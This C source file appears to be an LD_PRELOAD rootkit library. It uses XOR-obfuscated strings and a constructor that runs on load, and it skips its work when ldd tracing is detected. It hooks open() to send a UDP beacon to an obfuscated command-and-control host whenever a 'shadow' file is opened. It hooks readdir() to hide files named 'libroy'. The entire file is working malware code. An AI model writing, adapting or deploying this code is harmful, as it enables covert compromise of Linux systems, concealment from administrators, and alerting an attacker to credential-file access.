#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <netdb.h>
#include <string.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <dirent.h>

static void dx(char *o, const unsigned char *s, int len, unsigned char k) {
    for(int i = 0; i < len; i++) {
        o[i] = s[i] ^ k;
    }
    o[len] = '\0';
}

static int is_safe_env() {
    if (getenv("LD_TRACE_LOADED_OBJECTS") != NULL) return 0;
    return 1;
}

__attribute__((constructor))
void preload_init(void) {
    if (!is_safe_env()) return;

    unsigned char ek[] = {0x14, 0x0f, 0x16, 0x0b, 0x14, 0x55, 0x17, 0x12, 0x19, 0x09, 0x14, 0x02, 0x24, 0x17, 0x14, 0x18, 0x10};
    char lock[32];
    dx(lock, ek, 17, 0x3B);

    int fd = open(lock, O_CREAT | O_EXCL, 0600);
    if (fd < 0) return;
    close(fd);

    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        _exit(0);
    }
}

static void beacon_c2() {
    if (!is_safe_env()) return;

    unsigned char eh[] = {0x0c, 0x00, 0x0d, 0x08, 0x02, 0x08, 0x0e, 0x14, 0x12, 0x4c, 0x02, 0x0e, 0x13, 0x11, 0x4c, 0x0d, 0x0e, 0x02, 0x00, 0x0d};
    char host[32];
    dx(host, eh, 20, 0x2D);

    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) return;

    struct hostent *he = gethostbyname(host);
    if (!he) {
        close(sockfd);
        return;
    }

    struct sockaddr_in dns_addr;
    dns_addr.sin_family = AF_INET;
    dns_addr.sin_port = htons(5353);
    memcpy(&dns_addr.sin_addr, he->h_addr_list[0], he->h_length);

    unsigned char pkt[64] = {
        0x13, 0x37, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x07, 'c','h','e','c','k','i','n', 0x05, 'l','o','c','a','l', 0x00,
        0x00, 0x01, 0x00, 0x01
    };

    sendto(sockfd, pkt, 31, 0, (struct sockaddr*)&dns_addr, sizeof(dns_addr));
    close(sockfd);
}

int (*orig_open)(const char *pathname, int flags, ...) = NULL;
int open(const char *pathname, int flags, ...) {
    if (!orig_open) {
        orig_open = dlsym(RTLD_NEXT, "open");
    }

    if (pathname && strstr(pathname, "shadow")) {
        beacon_c2();
    }

    va_list args;
    va_start(args, flags);
    mode_t mode = 0;
    if (flags & O_CREAT) {
        mode = va_arg(args, mode_t);
        va_end(args);
        return orig_open(pathname, flags, mode);
    }
    va_end(args);
    return orig_open(pathname, flags);
}

struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, "libroy") != NULL) {
            continue; 
        }
        break;
    }
    return dir;
}